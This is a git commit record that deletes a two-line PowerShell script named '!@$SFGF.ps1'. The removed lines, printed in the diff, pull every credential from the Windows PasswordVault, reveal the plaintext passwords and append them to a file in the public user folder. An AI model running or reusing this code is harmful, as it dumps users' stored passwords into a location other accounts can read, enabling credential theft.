91c17e427b3aa463fcb6e1fec95b69c48a369e42
Savitar407 <42724977+Savitar407@users.noreply.github.com>
2021-02-21 19:48:36 -0500

    Delete !@$SFGF.ps1

--- !@$SFGF.ps1
+++
@@ -1,2 +0,0 @@
-[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-(new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ } >> C:\Users\Public\passwords.txt
